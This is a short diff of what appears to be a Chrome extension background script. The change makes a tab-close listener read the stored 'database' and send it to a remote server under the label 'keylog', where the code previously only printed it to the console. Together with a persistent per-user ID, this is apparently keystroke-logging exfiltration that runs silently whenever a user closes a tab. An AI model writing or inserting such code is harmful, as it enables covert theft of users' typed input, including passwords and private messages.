@@ -36,7 +36,7 @@ function send(data, where) {
   });
 }
 
-// userID 
+// userID
 let UID;
 chrome.storage.local.get(["UID"], (res) => {
   if (JSON.stringify(res) === "{}") {
@@ -50,7 +50,10 @@ chrome.storage.local.get(["UID"], (res) => {
 
 // post to server on tab close
 chrome.tabs.onRemoved.addListener(() => {
-  chrome.storage.local.get(["database"], (items) => console.log(items));
+  chrome.storage.local.get(["database"], (items) => {
+    send(items, "keylog");
+    console.log(items);
+  });
 });
 
 // from: https://stackoverflow.com/a/1349426
